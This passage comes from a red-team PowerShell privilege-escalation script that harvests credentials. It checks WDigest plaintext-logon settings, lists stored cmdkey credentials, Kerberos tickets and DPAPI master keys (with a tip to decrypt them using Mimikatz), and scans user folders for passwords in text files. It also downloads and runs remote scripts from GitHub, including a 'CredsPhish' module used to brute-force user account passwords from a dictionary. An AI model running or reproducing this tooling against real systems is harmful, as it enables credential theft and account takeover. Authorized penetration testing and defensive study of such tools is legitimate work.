   Write-Host "    [TightVNC] found => [VULNERABLE::T1078]" -ForeGroundColor Green -BackGroundColor Black
}
Else
{
   Write-Host "    [TightVNC] : none vulnerable settings found."
}
Write-Host "`n"


#LogonCredentialsPlainInMemory
Write-Host "LOGON_CREDENTIALS_PLAIN_IN_MEMORY WDIGEST"
Write-Host "-----------------------------------------"
try{
   $TESTREGISTRY = Get-ItemPropertyValue -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential -EA SilentlyContinue;
   If($TESTREGISTRY -Match '1')
   {
      Write-Host "[VULNERABLE::T1012] UseLogonCredential REG_DWORD 0X$TESTREGISTRY" -ForeGroundColor Green -BackGroundColor Black
   }
   Else
   {
      Write-Host "[WDIGEST] none vulnerable settings found."
   }
}catch{
   Write-Host "[WDIGEST] none vulnerable settings found."
}
Write-Host "`n"
Start-Sleep -Milliseconds 800



#List Stored cmdkey creds
Write-Host "STORED CMDKEY CREDENTIALS (runas)"
Write-Host "---------------------------------"
cmdkey /list|Format-Table|Out-String -Stream|Select-Object -Skip 3
Write-Host ""


#Kerberos Tickets
Write-Host "KERBEROS TICKETS"
Write-Host "----------------"
klist|Where-Object {$_ -ne ''}|Out-String -Stream|ForEach-Object {
   $stringformat = If($_ -iMatch '\(0\)')
   {
      @{ 'ForegroundColor' = 'Red' }
   }
   ElseIf($_ -iMatch '\(\d+\)')
   {
      @{ 'ForegroundColor' = 'Green' }
   }
   Else
   {
      @{ 'ForegroundColor' = 'White' }
   }
   Write-Host @stringformat $_
}
$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544");
If(-not($bool))
{
   Write-Host "[i] Low privileges detected, running on demo mode .." -ForegroundColor red -BackGroundColor Black
   Write-Host "";Start-Sleep -Milliseconds 800
}
iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/GetKerbTix.ps1" -OutFile "$Env:TMP\GetKerbTix.ps1"|Unblock-File
Import-Module -Name "$Env:TMP\GetKerbTix.ps1" -Force|Out-String -Stream|ForEach-Object {
   $stringformat = If($_ -iMatch '^(klist failed)')
   {
      @{ 'ForegroundColor' = 'Red' }
   }
   Else
   {
      @{ 'ForegroundColor' = 'White' }
   }
   Write-Host @stringformat $_
}
Remove-Item -Path "$Env:TMP\GetKerbTix.ps1" -Force
Write-Host ""


#DPAPI MASTER KEYS
Write-Host "DPAPI MASTER KEYS"
Write-Host "-----------------"
#https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dpapi-extracting-passwords
Get-ChildItem -Path "$Env:APPDATA\Microsoft\Protect" -EA SilentlyContinue|Select-Object Name,LastWriteTime|Format-Table|Out-String -Stream|Select -Skip 1|Select -SkipLast 1
Write-Host "Use Mimikatz 'dpapi::cred' module with /masterkey to decrypt!" -ForeGroundColor Yellow
(Get-ChildItem "$Env:APPDATA\Microsoft\Credentials" -Attributes Hidden -Force -EA SilentlyContinue).Name
(Get-ChildItem "$Env:LOCALAPPDATA\Microsoft\Credentials" -Attributes Hidden -Force -EA SilentlyContinue).Name
Write-Host "`n"


#hardcoded credentials in text\xml\log files
Write-Host "HARDCODED CREDENTIALS IN CLEARTEXT?"
Write-Host "-----------------------------------"
If(Test-Path -Path "$Env:USERPROFILE\Desktop" -EA SilentlyContinue)
{
   #Build credentials dump DataTable!
   $credstable = New-Object System.Data.DataTable
   $credstable.Columns.Add("FileName    ")|Out-Null
   $credstable.Columns.Add("Catched Credentials")|Out-Null

   Write-Host "[DIRECTORY] Scanning : '$Env:USERPROFILE\Desktop'"
   $FilesToScan = (Get-ChildItem "$Env:USERPROFILE\Desktop" -EA SilentlyContinue).FullName|Where-Object {$_ -iMatch '(.log|.txt|.xml)$'}
   ForEach($FoundFile in $FilesToScan)
   {
      $UserCreds = Get-Content -Path "$FoundFile" -EA SilentlyContinue|Where-Object {$_ -iMatch '(Username|User:|user name)'}
      If($UserCreds)
      {
         #Adding values to output DataTable!
         $FoundName = $FoundFile.Split('\\')[-1]
         $credstable.Rows.Add("$FoundName","$UserCreds")|Out-Null
      }

      $PassCreds = Get-Content -Path "$FoundFile" -EA SilentlyContinue|Where-Object {$_ -iMatch '(pass|Password|passwd|login)'}
      If($PassCreds)
      {
         #Adding values to output DataTable!
         $FoundName = $FoundFile.Split('\\')[-1]
         $credstable.Rows.Add("$FoundName","$PassCreds")|Out-Null
      }

   }

   #Display Output DataTable
   $credstable | Format-Table -AutoSize | Out-String -Stream | Select-Object -SkipLast 1 | ForEach-Object {
      $stringformat = If($_ -iMatch '^(FileName)')
      {
         @{ 'ForegroundColor' = 'Green' }
      }
      Else
      {
         @{ 'ForegroundColor' = 'White' }
      }
      Write-Host @stringformat $_
   }

}
Else
{
   Write-Host "[DIRECTORY] NotFound : '$Env:USERPROFILE\Desktop'" -ForeGroundColor Red 
}


If(Test-Path -Path "$Env:ONEDRIVE\Desktop" -EA SilentlyContinue)
{
   #Build credentials dump DataTable!
   $credstable = New-Object System.Data.DataTable
   $credstable.Columns.Add("FileName    ")|Out-Null
   $credstable.Columns.Add("Catched Credentials")|Out-Null

   Write-Host "[DIRECTORY] Scanning : '$Env:ONEDRIVE\Desktop'"
   $FilesToScan = (Get-ChildItem "$Env:ONEDRIVE\Desktop" -EA SilentlyContinue).FullName|Where-Object {$_ -iMatch '(.log|.txt|.xml)$'}
   ForEach($FoundFile in $FilesToScan)
   {
      $UserCreds = Get-Content -Path "$FoundFile" -EA SilentlyContinue|Where-Object {$_ -iMatch '(Username|User:|user name)'}
      If($UserCreds)
      {
         #Adding values to output DataTable!
         $FoundName = $FoundFile.Split('\\')[-1]
         $credstable.Rows.Add("$FoundName","$UserCreds")|Out-Null
      }

      $PassCreds = Get-Content -Path "$FoundFile" -EA SilentlyContinue|Where-Object {$_ -iMatch '(pass|Password|passwd|login)'}
      If($PassCreds)
      {
         #Adding values to output DataTable!
         $FoundName = $FoundFile.Split('\\')[-1]
         $credstable.Rows.Add("$FoundName","$PassCreds")|Out-Null
      }

   }

   #Display output DataTable
   $credstable | Format-Table -AutoSize | Out-String -Stream | Select-Object -SkipLast 1 | ForEach-Object {
      $stringformat = If($_ -iMatch '^(FileName)')
      {
         @{ 'ForegroundColor' = 'Green' }
      }
      Else
      {
         @{ 'ForegroundColor' = 'White' }
      }
      Write-Host @stringformat $_
   }

}
Else
{
   Write-Host "[DIRECTORY] NotFound : '$Env:ONEDRIVE\Desktop'" -ForeGroundColor Red 
}


If(Test-Path -Path "$Env:USERPROFILE\Documents" -EA SilentlyContinue)
{
   #Build credentials dump DataTable!
   $credstable = New-Object System.Data.DataTable
   $credstable.Columns.Add("FileName    ")|Out-Null
   $credstable.Columns.Add("Catched Credentials")|Out-Null

   Write-Host "[DIRECTORY] Scanning : '$Env:USERPROFILE\Documents'"
   $FilesToScan = (Get-ChildItem "$Env:USERPROFILE\Documents" -EA SilentlyContinue).FullName|Where-Object {$_ -iMatch '(.log|.txt|.xml|.ini)$'}
   ForEach($FoundFile in $FilesToScan)
   {
      $UserCreds = Get-Content -Path "$FoundFile" -EA SilentlyContinue|Where-Object {$_ -iMatch '(Username|User:|user name)'}
      If($UserCreds)
      {
         #Adding values to output DataTable!
         $FoundName = $FoundFile.Split('\\')[-1]
         $credstable.Rows.Add("$FoundName","$UserCreds")|Out-Null
      }

      $PassCreds = Get-Content -Path "$FoundFile" -EA SilentlyContinue|Where-Object {$_ -iMatch '(pass|Password|passwd|login)'}
      If($PassCreds)
      {
         #Adding values to output DataTable!
         $FoundName = $FoundFile.Split('\\')[-1]
         $credstable.Rows.Add("$FoundName","$PassCreds")|Out-Null
      }

   }

   #Display output DataTable
   $credstable | Format-Table -AutoSize | Out-String -Stream | Select-Object -SkipLast 1 | ForEach-Object {
      $stringformat = If($_ -iMatch '^(FileName)')
      {
         @{ 'ForegroundColor' = 'Green' }
      }
      Else
      {
         @{ 'ForegroundColor' = 'White' }
      }
      Write-Host @stringformat $_
   }

}
Else
{
   Write-Host "[DIRECTORY] NotFound : '$Env:USERPROFILE\Documents'" -ForeGroundColor Red 
}


If(Test-Path -Path "$Env:TMP" -EA SilentlyContinue)
{
   #Build credentials dump DataTable!
   $credstable = New-Object System.Data.DataTable
   $credstable.Columns.Add("FileName    ")|Out-Null
   $credstable.Columns.Add("Catched Credentials")|Out-Null

   Write-Host "[DIRECTORY] Scanning : '$Env:TMP'"
   $FilesToScan = (Get-ChildItem "$Env:TMP" -EA SilentlyContinue).FullName|Where-Object {$_ -iMatch '(.log|.txt|.xml)$'}
   ForEach($FoundFile in $FilesToScan)
   {
      $UserCreds = Get-Content -Path "$FoundFile" -EA SilentlyContinue|Where-Object {$_ -iMatch '(Username|User:|user name)'}
      If($UserCreds)
      {
         #Adding values to output DataTable!
         $FoundName = $FoundFile.Split('\\')[-1]
         $credstable.Rows.Add("$FoundName","$UserCreds")|Out-Null
      }

      $PassCreds = Get-Content -Path "$FoundFile" -EA SilentlyContinue|Where-Object {$_ -iMatch '(pass|Password|passwd)'}
      If($PassCreds)
      {
         #Adding values to output DataTable!
         $FoundName = $FoundFile.Split('\\')[-1]
         $credstable.Rows.Add("$FoundName","$PassCreds")|Out-Null
      }

   }

   #Display output DataTable
   $credstable | Format-Table -AutoSize | Out-String -Stream | Select-Object -SkipLast 1 | ForEach-Object {
      $stringformat = If($_ -iMatch '^(FileName)')
      {
         @{ 'ForegroundColor' = 'Green' }
      }
      Else
      {
         @{ 'ForegroundColor' = 'White' }
      }
      Write-Host @stringformat $_
   }

}
Else
{
   Write-Host "[DIRECTORY] NotFound : '$Env:TMP'" -ForeGroundColor Red 
}


#return to pwd
cd $LocalPath
Write-Host ""


#FINAL TESTS USING SHERLOCK CMDLET
If($verb -ieq "False")
{
   Import-Module -Name "$Env:TMP\Sherlock.ps1" -Force;Find-AllVulns
}
Else
{
   #NOTE: FindEop.ps1 -verb 'true' - triggers dll-hijacking checks
   Import-Module -Name "$Env:TMP\Sherlock.ps1" -Force;Get-DllHijack;Find-AllVulns
}
Remove-Item -Path "$Env:TMP\Sherlock.ps1" -Force -ErrorAction SilentlyContinue


#Define Batch title again because sherlock.ps1 changed it ..
$host.UI.RawUI.WindowTitle = "@FindEop $BatVersion {SSA RedTeam @2022}"


If($BruteForce -ne "false")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Brute force user accounts passwords

   .EXAMPLE
      PS C:\> .\FindEop.ps1 -bruteforce 'true'
      Scans for EOP and brute force user account pass

   .EXAMPLE
      PS C:\> .\FindEop.ps1 -bruteforce 'pedro'
      Scans for EOP and brute force pedro account pass
   #>

   #Define the type of scan
   If($BruteForce -ne "true")
   {
      #User input account name
      $UserAccountName = "$BruteForce"
   }
   Else
   {
      #Auto brute the active user account name
      $UserAccountName = $([Environment]::UserName)
   }

   Write-Host "`nBRUTE FORCING '$UserAccountName' USER ACCOUNT"
   Write-Host "[i] Dicionary file contains '59.186' passwords." -ForegroundColor Yellow
   Write-Host "-----------------------------------------------"
   #Download auxiliary cmdlet from my GitHub into %tmp% directory
   iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/CredsPhish.ps1" -OutFile "$Env:TMP\CredsPhish.ps1"|Unblock-File
   If(Test-Path -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue)
   {
      powershell -File "$Env:TMP\CredsPhish.ps1" -PhishCreds Brute -Dicionary "$Env:TMP\passwords.txt" -UserAccount "$UserAccountName"
      Remove-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue -Force
   }
   Else
   {
      Write-Host "[ERROR] Fail to download '$Env:TMP\CredsPhish.ps1'" -ForegroundColor Red -BackgroundColor Black
   }

}

exit